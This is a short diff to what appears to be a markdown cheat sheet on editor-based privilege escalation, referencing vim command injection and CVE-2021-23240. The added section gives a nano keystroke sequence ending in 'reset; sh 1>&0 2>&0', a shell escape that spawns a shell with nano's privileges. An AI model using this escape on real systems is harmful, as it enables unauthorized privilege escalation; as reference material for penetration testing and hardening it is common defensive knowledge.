@@ -169,6 +169,12 @@ editor = `vim` <<< command injection
 
 [more about cve-2021-23240](./supp/cve-2021-23240)
 
+
+### 7-supp for nano
+```
+ctrl+r >>> ctrl+x >>> reset; sh 1>&0 2>&0
+```
+
 ---
 
 # end
